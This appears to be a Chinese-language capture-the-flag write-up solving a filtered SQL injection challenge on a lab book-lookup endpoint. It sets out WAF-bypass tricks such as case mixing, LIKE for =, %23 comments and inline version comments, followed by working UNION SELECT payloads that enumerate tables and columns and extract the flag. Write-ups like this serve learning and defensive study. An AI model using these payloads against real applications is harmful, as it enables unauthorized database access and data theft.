进入了一个熟悉的界面,依然是参数在url里面
那直接先看看有没有sql注入
```url
http://forward.vidar.club:30429/books/=1'
```
sql error了,证明在这里后端是把我们的输入拼入了sql语句的

那尝试经典的攻击语句
```url
http://forward.vidar.club:30429/books/=1' or 1=1 --%20
```
它拼入了sql语句的话大概会长这样
```sql
SELECT * FROM books where id = '1' or 1=1 --%20'
```
因为1=1恒为真,所以预期会输出所有的books

但接下来的发生的事情就不太一样了,返回:==🔴哼!就这水平还想拿flag？==
根据题目信息,看来是使用了waf来进行过滤

尝试把一些常见的词语放进去,看看那些被过滤了
发现常用的:in or and order 和一些符号 = -被过滤了,但'好像没有被过滤

## 那我们寻找绕过过滤的方法
,先看看怎么绕过对符号的过滤吧:
- =  使用==🔴**Like**==代替,注意L大写
- -   充当注释符,可以使用# 或者用==🔴||'1==来闭合后面的'达到一样的效果
对于关键词的过滤,我们可以尝试以下方法:
- 用其它的词代替,如用  || 来代替or
- 尝试改变大小写或者大小写混用,因为mysql不区分大小写
-  尝试在单词中间添加注释,如` /*!50000select*/`,这个表示50000版本以上才执行

 对绕过waf就先到这里
## 尝试开始注入
用order by确定列数,再用union拼接得到关键信息
```url
http://forward.vidar.club:30739/books/1' oRDer by 1 %23
```
这里用oRDer的大小写混合绕过对or和order的过滤,用#来绕过对-的过滤,
但注意, 在url中,#是**锚点**, 所以会被浏览器吞掉,可以用%23来代替

这样一直尝试,直到4的时候报错,说明列长为3
那可以用union拼接了
```url
[forward.vidar.club:30739/books/0' Union selecT 1,2,3 %23]
http://forward.vidar.club:30739/books/0'%20Union%20selecT%201,2,3%20%23
```
返回:`Vidar-Team has 3 books called 2`.说明回显位置在3和2列处
使用database()函数查看数据库名
```
0' Union selecT 1,datAbasE(),3 %23
```
成功:数据库名为book

接下来查看表名
```
,0' Union selecT 1,schEma_nAme,3 frOm imFoRMAtIon_scHema.scHEmaTa %23
```
显示` "error": "Error 1142: SELECT command denied to user 'book'@'127.0.0.1' for table 'scHEmaTa'"` 意为没有权限看不了
schmata是可以查看服务器的全部库信息,权限较高,但在这里只有一个database,
所以可以用权限要求更低的schema.table(只查看一个book库)

注意:以后写payload为了方便阅读,我会写出完整的mysql语句,只取用部分即可(记得在结尾加#) group_concat(table_name)
```sql
SELECT ... FROM books WHERE id = '0'
UNION
SELECT 1,table_name, 3
FROM information_schema.tables -- 注意后面在大小写混写时把o r分开!!!!!!!!!!!
WHERE table_schema LIKE 'book' -- 用Like替代=1
```
这里试图访问表名,但发现这里居然只返回了books一张表?
其实问题早早就已经出现过了,在上面尝试payload`http://forward.vidar.club:30429/books/=1' or 1=1 --%20`的时候,
本来应该返回全部book的,但只返回了一个book,
说明后端有程序限制只显示返回的第一行!!

怎么办, 用`group_concat()`函数! 它能把多行内容用,链接然后放到一起
于是我们就能得到表名了` 0' Union selecT 1,group_concat(table_name),3 frOm infOrmation_schema.tables whErE table_schema liKe schema()%23`
返回`Vidar-Team has 3 books called books,seeeeeeeeeeeeeeeecrret`

然后是获取列名
```mysql
SELECT ... FROM books where id = '1'
UNION
select 1,group_concat(column_name),3
from information_ochema.columns 
where table_schema liKe 'book'
```
 所以有以下payload
 `0' Union selecT 1,group_concat(column_name),3 frOm infOrmation_schema.columns whErE table_schema liKe 'book'%23`
 回显:`Vidar-Team has 3 books called id,name,number,fllllllllllllllllllllllaaa444g`
 很明显flag列在前面的scret table里面
 所以最后读取flag列
 ```mysql
 SELECT ... FROM books where id = '1'
 union
 select 1,fllllllllllllllllllllllaaa444g,3
 from seeeeeeeeeeeeeeeecrret
 ```
 对应payload  `0'%20Union%20selecT%201,fllllllllllllllllllllllaaa444g,3%20frOm%20seeeeeeeeeeeeeeeecrret%23`
 得到flag!!

其实和第一题确实差不多,加了一些过滤和权限